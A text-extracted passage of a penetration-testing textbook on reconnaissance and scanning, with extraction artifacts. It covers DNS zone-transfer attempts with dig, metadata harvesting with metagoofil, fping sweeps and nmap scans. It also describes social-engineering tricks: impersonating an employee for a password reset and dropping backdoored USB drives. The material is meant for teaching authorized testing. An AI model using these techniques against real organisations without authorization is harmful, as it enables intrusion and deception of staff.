IGURE 2.8 Site Report for Syngress.com. D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":52,"pageContent":"Reconnaissance ChApTER 2 33 other things, dns is responsible for the process of translating domain names to i P addresses. As humans, it is much easier for us to remember “google.com” rather than http://74.125.95.105. However, machines prefer the reverse. dns serves as the middle man to perform this translation process. As penetration testers, it is important to focus on the dns servers that belong to our target. t he reason is simple. i n order for dns to function properly, it needs to be aware of both the i P address and the corresponding domain name of each computer on its network. i n terms of reconnaissance, gaining full access to a company’s dns server is like finding a pot of gold at the end of a rainbow. o r maybe, more accurately, it is like finding a blueprint to the organization. But in this case the blueprint contains a full listing of internal i P addresses that belong to our target. remember one of the key elements of information gathering is to collect iP addresses that belong to the target. Aside from the pot of gold, another reason why picking on dns is so enjoy- able is that in many cases these servers tend to operate on the “if it isn’t broke, don’t touch it” principle. i nexperienced network administrators often regard their dns servers with sus- picion and mistrust. o ftentimes, they choose to ignore the box completely because they do not fully understand it. As a result touching, patching, updat- ing, or changing configurations on the dns server is often a low priority. Add this to the fact that most dns servers appear to be very stable (as long as the administrator is not monkeying with it) and you have a recipe for a security disaster. t hese admins wrongly learn early in their career that the less they mess with their dns servers, the less trouble it seemed to cause them. As a penetration tester, given the number of misconfigured and unpatched dns servers that abound today, it is natural to assume that many current net- work admins operate under this same principle. i f the above statements are true in even a small number of organizations, we are left with valuable targets that have a high probability of being unpatched or out of date. s o the next logical question becomes, how do we access this virtual pot of gold? Before we can begin the process of examining a dns server, we need an i P address. e arlier in our reconnaissance, we came across several references to dns . s ome of these references were by host names, whereas oth- ers were by i P addresses. Using the host command, we can translate any host names into i P addresses and add these i Ps to the potential target list. Again, you must be sure to double- and triple-check that the i P you collect is within your authorized scope before continuing. n ow that we have a list of dns i P addresses that belong to or serve our tar- get we can begin the process of interrogating dns to extract information. Although it is becoming more rare to find, one of our first tasks when interact- ing with a target dns is to attempt a zone transfer. remember dns servers contain a series of records that match up the i P address and host name for all the devices that the servers are aware of. m any networks"},{"pageNumber":53,"pageContent":"The Basics of hacking and penetration T esting 34 deploy multiple dns servers for the sake of redundancy or load balancing. As a result, dns servers need a way to share information. t his “sharing” process occurs through the use of a zone transfer. d uring a zone transfer, also com- monly referred to as A xfr, one dns server will send all the host-to- iP map- pings it contains to another dns server. t his process allows multiple dns servers to stay in sync. e ven if we are unsuccessful in performing a zone transfer, we should still spend time investigating any dns servers that fall within our authorized scope. NS Lookup the first tool we will use to examine dsn is ns l ookup. ns l ookup is a tool that can be used to query dns servers and potentially obtain records about the various hosts of which it is aware. ns l ookup is built into many versions of l inux including Backtrack and is even available via the w indows command prompt! ns l ookup operates very similarly between the various operating sys- tems; however, you should always review the specifics for your particular sys- tem. You can do so in l inux by reviewing the ns l ookup man pages. t his is accomplished by opening a terminal and typing: root@bt~# man nslookup ns l ookup is a tool that can be run in interactive mode. t his simply means we will first invoke the program and then feed it the particular switches we need to make it function properly. we begin using ns l ookup by opening a termi- nal and entering: root@bt~# nslookup By issuing the “ nslookup ” command, we start the ns l ookup tool from the operating system. After typing “ nslookup ” and hitting enter, your usual “ # ” prompt will be replaced with a “ > ” prompt. At this point you can enter the additional information required for ns lookup to function. we begin feeding commands to ns l ookup by entering the “server” keyword and an iP address of the dns server you want to query. An example follows: server 8.8.8.8 ns lo okup will simply accept the command and present you with another “ > ” prompt. ne xt, we specify the type of record we are looking for. du ring the recon- naissance process, there are many types of records that you may be interested in. fo r a complete listing of the various d ns record types and their description, you can use your newly acquired go ogle skills! if you are looking for general infor- mation, you should set the type to any by using the keyword “ any ”: set type  any if you are looking for specific information from the dns server such as the i P address of the mail server that handles e-mail for the target organization, we would use the “ set type 5 mx ”."},{"pageNumber":54,"pageContent":"Reconnaissance ChApTER 2 35 we wrap up our initial dns interrogation with ns l ookup by entering the tar- get domain after the next “ > ” prompt. s uppose you wanted to know what mail server is used to handle the e-mail for s yngress. i n a previous example, we determined that one of s yngress’s name servers was “ ns1.dreamhost.com ”. Here again we can use the host tool to quickly determine what i P address is associated with ns1.dreamhost.com. w ith this information in hand, we can use ns l ookup to query dns and find mail server for s yngress. f igure 2.10 shows an example of this process; the name of the e-mail server has been highlighted (in the bottom right of the screenshot) and now needs to be added to our potential target list. Dig Another great tool for extracting information from dns is “dig.” to work with dig, we simply open a terminal and enter the following command: dig @target_ip na turally, you will need to replace the “ target_ip ” with the actual iP a ddress of your target. Among other things, dig makes it very simple to attempt a zone transfer. re call that a zone transfer is used to pull multiple records from a d ns server. in some cases, a zone transfer can result in the tar- get d ns server sending all the records it contains. th is is especially valuable if your target does not distinguish between internal and external iP s when con- ducting a zone transfer. we can attempt a zone transfer with dig by using the “ –t AXFR ” switch. i f we wanted to attempt a zone transfer against a fictitious dns server with an i P address of 192.168.1.23 and a domain name of “example.com” we would issue the following command in a terminal window: dig @192.168.1.23 example.com –t AXFR f IGURE 2.10 Using Host and NS Lookup to Determine the E-mail Server of Our Target."},{"pageNumber":55,"pageContent":"The Basics of hacking and penetration T esting 36 if zone transfers are allowed and not restricted, you will be presented with a listing of host and i P addresses from the target dns server that relate to your target domain. Backtrack has many additional tools that can be used to interact with dns . t hese tools should be explored and utilized once you have a solid understand- ing of how dns works. Please see the end of this chapter for a brief discussion of some additional tools you may want to use when conducting a penetration test involving dns. EXTRACTING INfORMATION fROM E-MAIL SER v ERS e-mail servers can provide a wealth of information for hackers and penetration testers . i n many ways, e-mail is like a revolving door to your target’s organiza- tion. Assuming your target is hosting their own e-mail server, this is often a great place to attack. i t is important to remember, “You can’t block what you must let in.” i n other words, for e-mail to function properly, external traffic must pass through your border devices like routers and firewalls, to an internal machine, typically somewhere inside your protected networks. As a result of this, we can often gather significant pieces of information by interacting directly with the e-mail sever. o ne of the first things to do when attempting to recon an e-mail server is to send an e-mail to the organization with an empty .bat file or a nonmalicious .exe file like calc.exe. i n this case, the goal is to send a message to the target e-mail server inside the organization in the hope of having the e-mail server inspect, and then reject the message. on ce the rejected message is returned back to us, we can attempt to extract information about the target e-mail server. in many cases, the body of the message will include a precanned write-up explaining that the server does not accept e-mails with potentially dangerous extensions. th is message often indicates the specific vendor and version of antivirus that was used to scan the e-mail. As an attacker this is a great piece of information to have. Having a return message from a target e-mail server also allows us to inspect the headers of the e-mail. i nspecting the i nternet headers will often allow us to extract some basic information about the e-mail server, including i P addresses and the specific software versions or brand of e-mail server running. k nowing the i P address and software versions can be incredibly useful when we move into the exploitation phase (step 3). M eta G oo f il Another excellent information gathering tools is “ metagoofil.” m etagoofil is a metadata extraction tool that is written by the same folks who brought us the Harvester. m etadata is often defined as data about data. w hen you create a document like m icrosoft word or a PowerPoint presentation, additional data is created and stored within your file. t his data often includes various pieces of information that describe the document including the file name, the file size,"},{"pageNumber":56,"pageContent":"Reconnaissance ChApTER 2 37 the file owner or username of the person who created the file, and the location or path where the file was saved. t his process occurs automatically without any user input or interaction. t he ability of an attacker to read this information may present some unique insights into the target organization including usernames, system names, files shares, and other goodies. m etagoofil is a tool that scours the i nternet look- ing for documents that belong to your target. After finding these documents, m etagoofil downloads them and attempts to extract useful metadata. m etagoofil is built into Backtrack and can be found by navigating to the i nformation g athering section off of the Backtrack option in the All Programs menu. l ikewise, you can open a terminal window and enter the following command: cd /pentest/enumeration/google/metagoofil After navigating to the m etagoofil directory, it is a good idea to create a “files” folder. t he purpose of this folder is to hold all the target files that will be downloaded; this keeps the original directory clean. You can create a new folder by entering: mkdir files with this directory setup, you can run m etagoofil by issuing the following command: ./metagoofil.py -d syngress.com –f all -o results –t files le t us examine the details of this command. “ ./metagoofil.py ” is used to invoke the me ta go ofi l python script. do not forget to put the “ ./ ” in front of the command. th e “ –d ” switch is used to specify the target domain to be searched. th e “ –f ” switch is used to specify which type or types of files you want me ta go ofi l to attempt to locate. Utilizing the “all” switch will force me ta go ofi l to locate and download all the different format types that it can process includ- ing ppt, pdf, xls, odp, docx and others. You can also specify individual file types to limit the returned results. we use the “ –o ” switch to specify the name of the report that me ta go ofi l will generate for us. la stly we specify the folder where we want to store each of the files that me ta go ofi l locates and downloads. in an ear- lier step we created a “ files ” directory; as a result, our command “ –f files ” will save each of the discovered documents into this folder. w hile the output from m etagoofil against s yngress reveals nothing, below you will find a sample of the tool’s output from a recent penetration test that clearly provides additional value and should be included with our reconnais- sance data. C:\\Documents and Settings\\dennisl\\My Documents\\ this example is rich with information. f irst, it provides us with a valid net- work username “dennisl.” s econd, it clearly shows that d ennis uses a w indows machine."},{"pageNumber":57,"pageContent":"The Basics of hacking and penetration T esting 38 SOCIAL ENGINEERING no discussion of reconnaissance would be complete without including social engineering. m any people would argue that social engineering is one of the most simple and effective means for gathering information about a target. s ocial engineering is the process of exploiting the “human” weakness that is inherent in every organization. w hen utilizing social engineering, the attacker’s goal is to get an employee to divulge some information that should be kept confidential. l et us assume you are conducting a penetration test on an organization. d uring your early reconnaissance, you discover an e-mail address for one of the company’s sales people. You understand that sales people are highly likely to return product inquiry e-mails. As a result, you sent an e-mail from an anon- ymous address feigning interest in a particular product. i n reality, you did not care about the product. t he real purpose of sending the e-mail is to get a reply from the sales person so you can review the e-mail headers contained in the response. t his process will allow you to gather additional information about the company’s internal e-mail servers. l et us take our social engineering example one step further. s uppose our sales- man’s name is Ben o wned (we found this information during our reconnais- sance of the company website and in the signature of his e-mail response). l et us assume that in this example, when you sent the employee the product inquiry e-mail, you received an automatic reply with the notification that Ben o wned was “currently out of the office travelling overseas” and “would be gone for two weeks with only limited e-mail access.” A classic example of social engineering would be to impersonate Ben o wned and call the target company’s tech support number asking for help resetting your password because you are overseas and cannot access your webmail. i f you are lucky, the tech support people will believe your story and reset the password. Assuming they use the same password, you now have access to Ben o wned’s e-mail and other network resources like VP n for remote access, or ft P for uploading sales figures and customer orders. s ocial engineering, like reconnaissance in general, takes both time and prac- tice. n ot everyone makes a good social engineer. i n order to be successful, you must be supremely confident, knowledgeable of the situation, and flexible enough to go “off script.” i f you are conducting social engineering over the phone, it can be extremely helpful to have detailed and well-written notes in case you are asked about some obscure detail. Another example of social engineering is to leave U sB thumb drives or cd s at the target organization. t he thumb drives should be distributed to several loca- tions in or near the organization. t he parking lot, the lobby, the bathroom, and an employee’s desk are all great “drop” locations. i t is human nature for most people to insert the thumb drive or cd into their P c just to see what is"},{"pageNumber":58,"pageContent":"Reconnaissance ChApTER 2 39 on the drive. i n this example though, the thumb drive or cd is preloaded with a self-executing backdoor program that automatically launches when the drive is inserted into the computer. t he backdoor is capable of bypassing the com- pany firewall and will dial home to the attacker’s computer, leaving the target exposed and giving the attacker a clear channel into the organization. we will discuss the topic of backdoors in chapter 6. SIfTING ThROUG h ThE INTEL TO fIND ATTACKABLE T ARGETS once you have completed the steps above, you need to schedule some time to closely review all the reconnaissance and information you have gathered. i n most cases, even light reconnaissance should produce a mountain of data. o nce the reconnaissance step is completed, you should have a solid under- standing of your target including the organization, structure, and even technol- ogies deployed inside the company. wh ile conducting the review process, it is a good idea to create a single list that can be used as a central repository for recording iP addresses. You should also keep separate lists that are dedicated to e-mail addresses, host names, and U r ls . Unfortunately, most of the data you collected will not be directly attackable. d uring the process of reviewing your findings, be sure to transform any rele- vant, non- iP-based information, into an i P address. Using g oogle and the host command you should be able to extract additional i Ps that relate to your tar- get. Add these to the iP list. After we have thoroughly reviewed the collected reconnaissance and trans- formed the data into attackable targets, we should have a list of i Ps that either belong to, serve, or are related to the target. As always, it is important to remember your authorized scope because not all the i Ps we collect will be within that range. As a result, the final step in reconnaissance is to review the i P list you just created and either contact the company to determine if you can increase the scope of the pen test or remove the iP address from your list. At this point you will be left with a list of i P addresses that you are authorized to attack. d o not discard or underestimate all the nonattackable information you have gathered. i n each of the remaining steps, we will be reviewing and extracting information from step 1. hOW DO I p RACTICE ThIS STE p? now that you have a solid understanding of the basic tools and techniques used to conduct reconnaissance, you will need to practice everything that was covered. t here are many ways to go about practicing this step. o ne simple and effective idea is to make a list of companies by reading a newspaper. i f you do not have access to a newspaper, any popular news website will do, like www. cnn.com, www.msnbc.com, etc."},{"pageNumber":59,"pageContent":"The Basics of hacking and penetration T esting 40 while making a list of potential targets to conduct reconnaissance on, try to focus on company names that you have not heard of before. Any good news- paper or website should contain dozens of companies that you are unfamil- iar with. o ne note of caution here, Y o U m Ust B e s Ure no t t o do A nY Ac tiVe reconn AissAnce! o bviously, you have not been authorized in any way to perform the active techniques we covered in this chapter. However, you can still practice gathering information through the passive techniques we dis- cussed. t his will allow you to refine and sharpen your skills. i t will also pro- vide you with an opportunity to develop a system for cataloging, organizing, and reviewing the data you collect. remember , while this may be the “least” technical phase, it has the potential for the best returns. Wh ERE DO I GO fROM hERE ? once you have practiced and mastered the basics of reconnaissance, you will be armed with enough information and skill to tackle adv anced topics in infor- mation gathering. t he following is a list of tools and techniques that will take your information-gathering ability to the next level: n s earch engine directives for sites other than google: l n o w that your go ogle- fu is strong, you need to master this technique using other search engines. mo st modern search engines include direc- tives or other ways to complete advanced searches. re member you should never rely on a single search engine to do all of your reconnaissance. se arching for the same keywords in different search engines often returns drastically different and surprisingly useful results. n s earch engine Assessment tool ( seAt ) l se At is a great tool to use for quickly querying several different search engines in a single pass. t his tool automates much of the manual labor required when performing reconnaissance across several different search engines. se At is built into Backtrack and available from its creator at www.midnightresearch.com. t heir site even includes useful “how to” videos for using seAt. n Johnn y long’s google Hacking database ( gHdB) l t h is is a single repository for some of the most effective and feared go ogle Hacks in existence today! it has already been mentioned and should go without saying but d o n ot rUn tHe se QU e ries AgAi nst UnA UtHo ri Ze d tAr gets ! You can find the gHdB at http://www. hackersforcharity.org/ghdb. wh ile you are there, take a minute to read about Hackers for ch arity and Johnny’s efforts with the “food for work” program. n Google Hacking f or Penetration Testers , 2nd edition, syngress l Johnn y’s google Hacking book is a must-read for all penetration testers. n P aterva’s maltego ce l m altego is a very powerful tool that aggregates information from pub- lic databases and provides shockingly accurate details about your tar- get organization. t hese details can be technical in nature, such as the"},{"pageNumber":60,"pageContent":"Reconnaissance ChApTER 2 41 location or i P address of your firewall, or they can be personal, such as the physical location of your currently (travelling) salesman. l earning to master m altego takes a little effort but is well worth your time. A free version is available in Backtrack. SUMMAR y information gathering is the first step in any penetration test or hack. e ven though this phase is less technical than most, its importance should not be overlooked. t he more information you are able to collect, the better your chances of success in later phases of the penetration test. At first, the amount of information that can be gathered on your target can seem a bit overwhelming, but with a good documentation process, the proper use of tools, and further practice you will soon master the art of reconnaissance."},{"pageNumber":61,"pageContent":"This page intentionally left blank"},{"pageNumber":62,"pageContent":"43 INTRODUCTION once step 1 has been completed, you should have a solid understanding of our target and a detailed collection of gathered information. t his data mainly includes our collection of i P addresses. recall that one of the final steps in reconnaissance was to create a list of i P addresses that both belonged to the target and that we were authorized to attack. t his list is the key to transition- ing from step 1 to step 2. i n step 1, we mapped our gathered information to Scanning ChApTER 3 Information in This Chapter: n Pings and Ping Sw eeps n P ort Scanning n V ulnerability Scanning"},{"pageNumber":63,"pageContent":"The Basics of h acking and p enetration Testing 44 attackable i P addresses. i n step 2, we will map i P addresses to open ports and services. i t is important to understand that it is the job of most networks to allow at least some communication to flow into and out of their borders. n etw orks that exist in complete isolation with no i nternet connection, no services like e-mail or web traffic, are very rare today. e ach service, connection, or potential connection to another network provides a potential foothold for an attacker. s canning is the process of identifying live systems and the services that exist on those systems. s tep 2 begins b y breaking the scanning process into three distinct phases: 2.1 d etermining if a s ystem is alive 2.2 Port scanning the s ystem 2.3 s canning the s ystem for vulnerabilities l ater in this chapter we will discuss tools that combine these phases into a sin- gle process; however, for the purpose of introducing and learning new mate- rial, it is best to cover them separately. s tep 2.1 is the process of determining whether a target system is turned on and capable of communicating or interacting with our machine. t his step is the least reliable and we should always continue with steps 2.2 and 2.3 regardless of the outcome of this test. r egardless, it is still important to conduct this step and make note of any machines that respond as alive. s tep 2.2 is the process of identifying the specific ports and services running a particular host. s imply defined, ports provide a way or location for software and networks to communicate with hardware like a computer. A port is a data connection that allows a computer to exchange information with other computers, software, or devices. Prior to the interconnection of computers and networks, information was passed between machines through the use of physical media like floppy drives. o nce computers were connected to a network, they needed an efficient means for communicating with each other. Ports were the answer. t he use of multiple ports allows for simultaneous communication without the need to wait. t o further clarify this point for those of you who are unfamiliar with ports and computers, it may be helpful to consider the following analogy: t hink of your computer as a house. t here are many different ways that a person can enter the house. e ach of the different ways to enter your house (computer) is like a com- puter port. Just like a port on a computer, all the entryways allow traffic to flow into and out of your home. i magine a house with unique numbers over each of the potential entry points. m ost people will use the front door. However, the owners may come in through the garage door. s ometimes , people enter the house from a backdoor D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":64,"pageContent":"Scanning ChApTER 3 45 Table 3.1 Common Port Numbers and Their Corr esponding Service Port Number Service 20 FTP data transfer 21 FTP control 22 SSH 23 Telnet 25 SMTP (e-mail) 53 DNS 80 HTTP 443 HTTPS or sliding glass door off the deck. An unconventional person may climb through a window or attempt to squeeze through the doggie door! regardless of how you get into your house, each of these examples corresponds nicely with the analogy of computers and ports. recall that ports are like gate- ways to your computer. s ome ports are more common and receive lots of traf- fic (just like your front door); others are more obscure and rarely used (by humans) like the doggie door. m any common network services run on standard port numbers and can give attackers an indication as to the function of the target system. table 3.1 pro- vides a list of common ports and their corresponding services. o bviously, there are many more ports and services. However, this list serves as a basic introduction to common ports that are utilized by organizations today. You will see these services repeatedly as you begin to port scan your targets. we need to pay special attention to the discovery of any open ports on our target systems. You should make detailed notes and save the output of any tool run in step 2.2. remember every open port is a potential gateway into the tar- get system. t he final step in scanning is step 2.3, vulnerability scanning. Vulnerability scanning is the process of locating and identifying known weaknesses in the services and software running on a target machine. t he discovery of known vulnerabilities on a target system can be like finding the pot of gold at the end of a rainbow. m any systems today can be exploited directly with little or no skill when a machine is discovered to have a known vulnerability. i t is important to mention that there is a difference in the severity of various vulnerabilities. s ome vulnerabilities may present little opportunities for an attacker, whereas others will allow you to completely take over and control a machine with a single click of a button. we will discuss the various levels of vulnerabilities in more detail later in the chapter. i n the past, i have had several clients ask me to attempt to gain access to some sensitive server on an internal network. o bviously in these cases, the final Table 3.1"},{"pageNumber":65,"pageContent":"The Basics of hacking and penetration T esting 46 target is not directly accessible via the i nternet. w hether we are going after some supersecret internal machine or simply attempting to gain access to a network, we usually begin by scanning the perimeter devices. t he reason for this is simple, we start at the perimeter because most of the information we have from step 1 belongs to perimeter devices. Also, with many of today’s tech- nologies and architectures, it is not always possible to reach directly into a net- work. As a result, we often employ a hacking methodology where we chain a series of machines together in order to reach our final target. f irst we conquer a perimeter device, then we move to an internal machine. Perimeter devices are computers, servers, routers, firewalls, or other equipment, which sit at the outer edge of a protected network. t hese devices serve as an intermediary between protected internal resources and external networks like the internet. As previously mentioned, we often begin by scanning the perimeter devices to look for weaknesses or vulnerabilities that will allow us to gain entry into the network. o nce we have successfully gained access (which we will discuss in c hapter 4), the scanning process can be repeated from the newly owned machine, in order to find additional targets. t his cyclical process allows us to create a very detailed internal network map and discover the critical infrastruc- ture hiding behind the corporate firewall. pINGS AND pING SWEE pS A ping is a special type of network packet called an i cm P packet. Pings work by sending specific types of network traffic, called i cm P ec ho re quest pack- ets, to a specific interface on a computer or network device. if the device (and the attached network card) that received the ping packet is turned on and not restricted from responding, the receiving machine will respond back to the originating machine with an ec ho re ply packet. Aside from telling us that a host is alive and accepting traffic, pings provide other valuable information including the total time it took for the packet to travel to the target and return. Pings also report traffic loss that can be used to gauge the reliability of a net- work connection. fi gure 3.1 shows an example of the ping command. t he first line in f igure 3.1 shows the ping command being issued. Please note, this particular screenshot was taken from a w indows machine. All modern ver- sions of l inux and w indows include the ping command. t he major difference between the l inux and w indows version is that by default the w indows ping command will send four e cho request packets and automatically terminate, whereas the l inux ping command will continue to send e cho request com- mands until you force it to stop. o n a l inux system, you can force a ping com- mand to stop sending packets by using the cntl  c combination. l et us focus our attention on the third line that starts with “ r eply from.” t his line is telling us that our icm P e cho request packet successfully reached the i P address of 64.233.167.99 and that the i P address sent a reply packet back to"},{"pageNumber":66,"pageContent":"Scanning ChApTER 3 47 our machine. t he “bytes  32” in the line indicate the size of the packet being sent. t he “time  26 ms” is telling you how long the entire round trip took for the packets to travel to and from the target. t he “ ttl  240” is a t ime to l ive value; this is used to determine the maximum number of hops the packet will take before automatically expiring. n ow that you have a basic understanding of how the ping command works, let us see how we leverage this tool as a hacker. Because we know that pings can be useful in determining if a host is alive, we can use the ping tool as a host discovery service. Unfortunately, pinging every potential machine on even a small network would be highly inefficient. fortunately for us, there are several tools that allow us to conduct ping sweeps. A ping sweep is a series of pings that are automatically sent to a range of i P addresses, rather than manually entering the individual target’s address. t he simplest way to run a ping sweep is with a tool called f Ping. f Ping is built into Backtrack and is run from the terminal. t he tool can also be downloaded for w indows. t he easiest way to run f Ping is to open terminal window and type the following: fping –a –g 172.16.45.1 172.16.45.254>hosts.txt . t he “ –a ” switch is used to show only the live hosts in our output. t his makes our final report much cleaner and easier to read. t he “ –g ” is used to specify the range of i P addresses we want to sweep. You need to enter both the begin- ning and the ending i P addresses. i n this example, we scanned all the i Ps from 172.16.45.1 to 172.16.45.254. t he “ > ” character is used to pipe the output to a file, and the hosts.txt is used to specify the name of the file our results will be saved to. t here are many other switches that can be used to change the func- tionality of the f Ping command. You can view them all by entering the follow- ing command in a terminal window: man fping f IGURE 3.1 An Example of the Ping Command."},{"pageNumber":67,"pageContent":"The Basics of hacking and penetration T esting 48 once you have run the command above, you can open the hosts.txt file that w as created to find a list of target machines that responded to our pings. t hese i P addresses should be added to your target list for later investigation. i t is important to remember that not every host will respond to ping requests; some hosts may be firewalled or otherwise blocking ping packets. pORT SCANNING no w that you have a list of targets, we can continue our examination by scan- ning the ports on each of the iP addresses we found. re call that the goal of port scanning is to identify which ports are open and determine what services are available on our target system. A service is a specific job or task that the com- puter performs like e-mail, f tP , printing, or providing web pages. Port scanning is like knocking on the various doors and windows of a house and seeing who answers. fo r example if we find that port 80 is open, we can attempt a connec- tion to the port and oftentimes get specific information about the web server that is listening on that port. t here are a total of 65,536 (0–65,535) ports on every computer. Ports can be either t cP or U dP depending on the service utilizing the port or nature of the communication occurring on the port. we scan computers to see what ports are in use or open. t his gives us a better picture of the purpose of the machine, which, in turn, gives us a better idea about how to attack the box. i f you had to choose only one tool to conduct port scanning, you would undoubtedly choose n map. n map was written by g ordon “ fyodor” ly on and is available for free from www.insecure.org and is built into many of today’s l inux distributions including Backtrack. Although it is possible to run n map from a graphical user interface ( gUi), we are going to focus on using the termi- nal to run our port scans. People who are new to security and hacking often ask why they should learn to use the command line or terminal version of a tool rather than relying on a gUi. th ese same people often complain that using the terminal is not as easy. th e response is very simple. fi rst, using the command line version of a tool will allow you to learn the switches and options that change the behavior of your tool. th is gives you more flexibility, more granular control, and a better under- standing of the tool you are running. se cond (and maybe more importantly), rarely does hacking work like it is portrayed in the movies. fi nally, the com- mand line can be scripted. sc ripting and automation become key when you want to advance your skillset to the next level. re member the movie Swordfish where Hugh Jackman is creating a virus? He is dancing and drinking wine, and apparently building a virus in a very graphical, gUi- driven way. th e point is that this is just not realistic. mo st people who are new to hacking assume that hacking is a very gUi- oriented task: that once you take over a machine you are presented with a desktop and control of the mouse and screen. Although this scenario is possible, it is rarely the case. in most jobs,"},{"pageNumber":68,"pageContent":"Scanning ChApTER 3 49 your main goal will be to get an administrative shell or backdoor access to the machine. th is shell is literally a terminal that allows you to control the target P c from the command line. it looks and feels just like the terminals that we have been working with, except a remote shell allows you to enter the commands on your computer terminal and have them executed on the target machine. so l earning the command line version of your tools is critical because once you have control of a machine you will need to upload your tools and interact with the target through a command prompt, not through a gUi. l et us assume you still refuse to learn the command line. l et us also assume that with the use of several tools you were able to gain access to a target system. w hen you gain access to that system, you will not be presented with a g Ui but rather with a command prompt. i f you do not know how to copy files, add users, modify documents, and make other changes through the command line, your work of owning the target will have been in vain. You will be stuck, like m oses who was able to see the promised land but not allowed to enter! w hen we conduct a port scan, our tool will literally create a packet and send it to each designated port on the machine. t he goal is to determine what kind of a response we get from the target port. d ifferent types of port scans can pro- duce different results. i t is important to understand the type of scan you are running as well as the expected output of that scan. The Three-Way handshake when two machines on any given network want to communicate using t cP, they do so by completing the three-way handshake. t his process is very similar to a phone conversation (at least before everyone had caller id !). w hen you want to talk to someone on the phone, you pick up the phone and dial the number, the receiver picks up the ringing phone not knowing who the caller is and says “Hello?,” the original caller then introduces himself by saying “Hi, this is John!” i n response to this, the original receiver will often acknowledge the caller by saying “ oh, hi John!” At this point both people have enough information for the conversation to continue as normal. c omputers work much the same way. w hen two computers want to talk, they go through a similar process. t he first computer connects to the second com- puter by sending a s Yn packet to a specified port number. i f the second com- puter is listening, it will respond with a s Yn/Ack . w hen the first computer receives the s Yn/Ack , it replies with an A ck packet. At this point, the two machines can communicate normally. i n our phone example above, the origi- nal dialer is like sending the s Yn packet. t he receiver picking up the phone and saying “Hello?” is like the s Yn/Ack packet and the original caller intro- ducing himself is like the A ck packet. Using Nmap to perfor m a TC p Connect Scan the first scan we will look at is called the t cP c onnect scan. t his scan is often considered the most basic and stable of all the port scans because n map"},{"pageNumber":69,"pageContent":"The Basics of hacking and penetration T esting 50 attempts to complete the three-way handshake on each port specified in the n map command. Because this scan actually completes the three-way hand- shake and then tears down the connection gracefully, there is little chance that you will flood the target system and cause it to crash. i f you do not specify a specific port range n map will scan the 1,000 most com- mon ports. Unless you are in a great hurry, it is always recommended specify- ing all ports. t he reason is that oftentimes crafty administrators will attempt to obscure a service by running it on a nonstandard port. You can scan all the ports by specifying “ -p- ” when running n map. Using the “ –PN ” switch with every n map scan is recommended. Utilizing the “ –PN ” switch will cause n map to disable host discovery and force the tool to scan every system as if it were alive. t his is extremely useful for discovering additional systems and ports that otherwise may be missed. to run a tc P connect, we issue the following command from a terminal: nmap –sT -p- -PN 172.16.45.135 take a moment to review this command. t he first word “nmap” causes the n map port scanner to start. t he second command “ –sT ” tells n map to run a t cP c onnect scan. s pecifically, to break this switch down even further, the “ -s ” is used to tell n map what kind of scan we want to run. t he “ -T ” in the “ -sT ” is used to run a scan type of t cP c onnect. we use the “ -p- ” to tell n map to scan all the ports not just the default 1,000. we use the “ –PN ” switch to skip the host discovery phase and scan all the addresses as if the system were alive and responding to ping requests. f inally, we specify the target i P address; obviously, your target’s i P address will be different from the one shown in the screenshot! f igure 3.2 shows the t cP c onnect n map scan and the output that was received when run against the target. o ftentimes, we need to run our scans against an entire subnet, or range of i P addresses. w hen this is the case, we can instruct n map to scan a continuous range of i Ps by simply appending the last octet of the ending i P address onto the scan like so: nmap –sT -p- -PN 172.16.45.1-254 f IGURE 3.2 TCP Connect Scan and Results."},{"pageNumber":70,"pageContent":"Scanning ChApTER 3 51 issuing this command will cause n map to port scan all the hosts between the i P addresses 172.16.45.1 and 172.16.45.254. Just like ping sweeps, this is a very powerful technique that can greatly improve the productivity of your scan- ning life! i f you need to scan a series of hosts that are not in sequential order, you can create a text file and list each host i P address on a single line. t hen add the “ –iL path_to_the_text_file ” switch to your n map command. d oing this allows you to scan all of your target hosts from a single command. w henever possible, always try to create a single text file containing all of your target i Ps. m ost of the tools we discuss have a switch or mechanism for loading this text file, which saves the effort or retyping, but more importantly, reduces the num- ber of times you will type each i P address and therefore reduces the chance that you will fat-finger the iP address and scan the wrong target. Using Nmap to perfor m a S yN Scan the s Yn s can is arguably the most popular n map port scan. t here are many reasons for its popularity, including the fact that it happens to be the default n map scan. i f you run the n map command without specifying a scan type (using the –s switch), nmap will use the sYn scan by default. Aside from the fact that the s Yn scan is the default choice, it is also popular because it is faster than the t cP connect scan and yet remains quite safe, with little chance of dos ’ing or crashing the target system. s Yn scans are faster because rather than completing the entire three-way handshake, it only com- pletes the first two steps. in a sYn scan, the scanning machine sends a sYn packet to the target and the target responds with a sYn/ Ac k (assuming the port is in use and not filtered) just like it did when we ran a t cP co nnect scan. However, at this point, rather than sending the traditional A c k packet, the scanning machine sends an r st (reset) packet to the target. th e reset packet tells the target machine to disre- gard any previous packets and close the connection between the two machines. it should be clear that the speed advantage of the sYn scan over the t cP co nnect scan comes from the fact that there are less packets sent between the hosts when using a sYn scan rather than a t cP co nnect scan. Although a few packets may not sound like a big advantage, it can add up quickly when scan- ning multiple hosts. i f we consider the example of comparing the three-way handshake to a phone call, s Yn scans would be like calling someone up, having the receiver pick up the phone and saying “Hello?”, and then simply hanging up on the person without a single word. Another advantage to the sYn scan is that in some instances, it provides a level of obscurity or stealth. Because of this feature, the sYn scan is often referred to as the “ st ealth sc an.” th e stealth portion of this scan comes from the fact that because the three-way handshake is never fully completed, the official"},{"pageNumber":71,"pageContent":"The Basics of hacking and penetration T esting 52 connection was never 100 percent established. th ere are applications and log files that require the completion of the three-way handshake before they begin recording activity. As a result, if a log file only records completed connections and the sYn scan never officially completes a single connection, this scan may be undetected by some applications. Please note, this is the exception and not the rule. All modern firewalls and intrusion detection systems in use today will detect and report a sYn scan! Because the s Yn scan is the default n map scan, we do not technically need to specify the scan type with the “–s” switch. However, because this book focuses on the basics, it is worth the effort to get into the habit of specifying your scan type. to run a s Yn scan, you can open a terminal window and issue the following command: nmap –sS -p- -PN 172.16.45.135 this command is exactly the same as the previous example with one excep- tion—rather than using an “–s t” we used an “–s s.” t his instructs n map to run a s Yn scan rather than a t cP c onnect scan. t he scan types are easy to remem- ber because a t cP c onnect scan begins with the letter “ t,” whereas the s Yn scan begins with the letter “ s.” e ach of the other switches was explained in the section above. Please review the “Using n map to c omplete a t cP c onnect s can” for a detailed breakdown of the switches in this command. f igure 3.3 shows the output of a sYn scan against our target. take a moment to compare the total run time between the two scans in f igures 3.2 and 3.3. e ven in our simple environment against a single host, the s Yn scan completed its execution faster. Using Nmap to perfor m UD p Scans one of 